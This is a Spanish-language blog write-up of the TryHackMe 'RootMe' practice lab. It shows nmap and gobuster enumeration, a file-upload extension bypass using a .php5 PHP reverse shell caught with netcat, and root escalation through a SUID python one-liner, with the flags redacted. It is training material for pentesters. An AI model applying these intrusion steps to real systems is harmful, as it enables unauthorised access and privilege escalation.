<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="RootMe Writeup [ES] - TryHackMe" /><meta property="og:locale" content="en" /><meta name="description" content="En esta ocasión estaré resolviendo el lab RootMe de la plataforma TryHackMe. Esta máquina es bastante sencilla como se verá a continuación." /><meta property="og:description" content="En esta ocasión estaré resolviendo el lab RootMe de la plataforma TryHackMe. Esta máquina es bastante sencilla como se verá a continuación." /><link rel="canonical" href="https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/" /><meta property="og:url" content="https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-02T05:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="RootMe Writeup [ES] - TryHackMe" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-04-02T05:00:00-03:00","datePublished":"2021-04-02T05:00:00-03:00","description":"En esta ocasión estaré resolviendo el lab RootMe de la plataforma TryHackMe. Esta máquina es bastante sencilla como se verá a continuación.","headline":"RootMe Writeup [ES] - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/"},"url":"https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/"}</script><title>RootMe Writeup [ES] - TryHackMe | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>RootMe Writeup [ES] - TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>RootMe Writeup [ES] - TryHackMe</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1617350400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-04-02 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="918 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p>En esta ocasión estaré resolviendo el lab <a href="https://www.tryhackme.com/room/rrootme">RootMe</a> de la plataforma <strong>TryHackMe</strong>. Esta máquina es bastante sencilla como se verá a continuación.</p><h2 id="lab-info"><span class="mr-2">Lab info</span><a href="#lab-info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/THM/RootMe/00-lab-info.png" alt="Lab Info" title="Machine Info" data-proofer-ignore></p><h2 id="task-1---deploy-the-machine"><span class="mr-2">Task 1 - Deploy the machine</span><a href="#task-1---deploy-the-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Desplegar la máquina, no requiere respuesta.</p><h2 id="task-2---reconnaissance"><span class="mr-2">Task 2 - Reconnaissance</span><a href="#task-2---reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>1 - Scan the machine, how many ports are open?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>2
</pre></table></code></div></div><p>Según el escáner realizado con <strong>nmap</strong>, podemos ver que existen 2 puertos abiertos. Se han utilizado los siguientes comandos:</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -p- -sS --min-rate 4000 -n -v 10.10.253.211 -oG allPorts.gnmap</code><li><code class="language-plaintext highlighter-rouge">nmap -sC -sV -p22,80 10.10.253.211 -oN ports.nmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.253.211
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>2 - What version of Apache is running?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>2.4.29
</pre></table></code></div></div><p>Esta información se puede visualizar desde el escaner nmap o realizando <code class="language-plaintext highlighter-rouge">whatweb http://10.10.253.211</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.253.211 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.253.211], Script, Title[HackIT - Home]
</pre></table></code></div></div><p>Desde el navegador se visualiza la siguiente home page:</p><p><img data-src="/images/THM/RootMe/05-web-page.png" alt="Web Page" data-proofer-ignore></p><p>3 - What service is running on port 22?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SSH
</pre></table></code></div></div><p>4 - Find directories on the web server using the GoBuster tool.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>No requiere respuesta
</pre></table></code></div></div><p>5 - What is the hidden directory?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/panel/
</pre></table></code></div></div><p>Gobuster scan:</p><ul><li><code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.253.211/ -t 300 --no-error</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>===============================================================
2021/04/02 19:02:50 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--&gt; http://10.10.253.211/uploads/]
/css                  (Status: 301) [Size: 312] [--&gt; http://10.10.253.211/css/]
/js                   (Status: 301) [Size: 311] [--&gt; http://10.10.253.211/js/]
/panel                (Status: 301) [Size: 314] [--&gt; http://10.10.253.211/panel/]
</pre></table></code></div></div><h2 id="task-3---getting-a-shell"><span class="mr-2">Task 3 - Getting a shell</span><a href="#task-3---getting-a-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Para esta tarea la plataforma solicita obtener una shell en base a lo que se ha descubierto anteriormente. Para ello revisamos la ruta <code class="language-plaintext highlighter-rouge">http://10.10.253.211/panel/</code> en donde se visualiza un panel para subir archivos.</p><p><img data-src="/images/THM/RootMe/10-web-upload-page.png" alt="Panel" data-proofer-ignore></p><p>Esto nos hace pensar que es posible subir un archivo que nos entable una reverse shell. Para que funcione, debemos saber que lenguaje interpretará la página. Revisando en Wappalyzer vemos que la web está construida en <code class="language-plaintext highlighter-rouge">php</code></p><p><img data-src="/images/THM/RootMe/15-web-upload-language.png" alt="PHP" data-proofer-ignore></p><p>Sabiendo esto, yo recomiendo utilizar el recurso de <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentest Monkey</a> para la reverse shell con PHP.</p><p>Descargamos el archivo y lo editamos para asegurarnos de definir nuestra IP y Puerto en el que queremos recibir la shell.</p><p><img data-src="/images/THM/RootMe/20-reverse-shell-php.png" alt="RSHELL" data-proofer-ignore></p><p>Probamos a subir el archivo y nos encontramos con el siguiente mensaje:</p><p><img data-src="/images/THM/RootMe/26-web-error.png" alt="Web Error" data-proofer-ignore></p><p>Lo que nos da a entender que la extensión del archivo no es válida.</p><p>Para lidiar con esto, lo que se puede hacer es crear múltiples archivos con distinta extensión y probar uno a uno o bien realizar esta comprobación con <strong>BurpSuite</strong> lo cual resulta más cómodo. Recordar que existe un <a href="https://www.tryhackme.com/room/rpburpsuite">room</a> en la plataforma de TryHackMe donde se puede aprender a utilizar BurpSuite desde cero.</p><p>Dicho lo anterior, lo que se debe hacer es interceptar la subida del archivo y analizar la respuesta del lado del servidor hasta que nos dé una respuesta satisfactoria.</p><p>Se intercepta la petición realizada por el navegador y posteriormente se envía al repeater. En la izquierda tenemos la petición realizada con un archivo con extensión <code class="language-plaintext highlighter-rouge">.php</code> y en la derecha se visualiza la respuesta indicando que la extensión no es válida.</p><p><img data-src="/images/THM/RootMe/30-burp-error.png" alt="Burp Error" data-proofer-ignore></p><p>Cambiamos la extensión y vemos que la respuesta ahora es satisfactoria. Esta respuesta se obtiene con las extensiones <code class="language-plaintext highlighter-rouge">.php2</code> <code class="language-plaintext highlighter-rouge">.php3</code> <code class="language-plaintext highlighter-rouge">.php4</code> <code class="language-plaintext highlighter-rouge">.php5</code>.</p><p><img data-src="/images/THM/RootMe/35-burp-ok.png" alt="Burp Ok" data-proofer-ignore></p><p>En mi caso subiré el archivo como rshell.php5</p><p><img data-src="/images/THM/RootMe/41-web-ok.png" alt="Web Ok" data-proofer-ignore></p><p>Como se aprecia en la imagen, se obtiene una respuesta exitosa y haciendo hovering en el texto señalado se obtiene la ruta del archivo que fue subido. En mi caso la ruta es: <code class="language-plaintext highlighter-rouge">http://10.10.253.211/uploads/rshell.php5</code></p><p>Ahora, con netcat abrimos el canal para la escucha tráfico en el puerto 443 que definimos anteriormente.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</pre></table></code></div></div><p>Y ejecutamos el archivo en el navegador para obtener una shell con el usuario www-data.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.13.0.103] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.253.211] 35932
Linux rootme 4.15.0-112-generic <span class="c">#113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 00:23:22 up  3:44,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
$
</span></pre></table></code></div></div><p>la flag de este usuario se encuentra en <code class="language-plaintext highlighter-rouge">/var/www/user.txt</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>THM<span class="o">{</span>y0u_<span class="k">**********</span><span class="o">}</span>
</pre></table></code></div></div><h2 id="task-4---privilege-escalation"><span class="mr-2">Task 4 - Privilege escalation</span><a href="#task-4---privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Para la fase de escalada de privilegios lo primero sería hacer una búsqueda de archivos con permiso SUID habilitado.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"snap"</span>

./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/traceroute6.iputils
./usr/bin/newuidmap
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/python
./usr/bin/at
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
./bin/mount
./bin/su
./bin/fusermount
./bin/ping
./bin/umount
</pre></table></code></div></div><p>En base a lo obtenido y haciendo uso de la web <a href="https://gtfobins.github.io/">GTFObins</a>, podemos identificar que se puede explotar python para obtener una shell con privilegios elevados. En la sección de SUID nos indican como realizarlo.</p><p><img data-src="/images/THM/RootMe/45-gtfobins.png" alt="Web Ok" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import os; os.execl("/bin/sh", "sh", "-p")'</span>
<span class="nb">whoami
</span>root
</pre></table></code></div></div><p>Por último se realiza una lectura de la flag ubicada en /root/root.txt</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>THM<span class="o">{</span>pr1v1l<span class="k">**********</span><span class="o">}</span>
</pre></table></code></div></div><p>Eso concluye la última pregunta de este lab.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/thm/'>THM</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=RootMe Writeup [ES] - TryHackMe - brsalcedom&amp;url=https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=RootMe Writeup [ES] - TryHackMe - brsalcedom&amp;u=https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/RootMe-Writeup-TryHackMe/&amp;text=RootMe Writeup [ES] - TryHackMe - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Jeeves-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1635796800" > 2021-11-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jeeves Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla. Información En...</p></div></div></a></div><div class="card"> <a href="/HackPark-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1596240000" > 2020-07-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackPark Writeup - TryHackMe</h3><div class="text-muted small"><p> This time we will be solving the HackPark room from TryHackMe. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey. Room info Enumeration ...</p></div></div></a></div><div class="card"> <a href="/PickleRick-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1617523200" > 2021-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pickle Rick Writeup - TryHackMe</h3><div class="text-muted small"><p> This time i’ll be working with the room Pickle Rick from TryHackMe. This is a free lab with an easy difficulty. Lab info Enumeration All ports nmap scan: nmap -p- -sS --min-rate 5000 -n -v 10....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Error-Reporting-Protocol-Writeup-247CTF/" class="btn btn-outline-primary" prompt="Older"><p>Error Reporting Protocol [ES] - 247CTF</p></a> <a href="/PickleRick-Writeup-TryHackMe/" class="btn btn-outline-primary" prompt="Newer"><p>Pickle Rick Writeup - TryHackMe</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
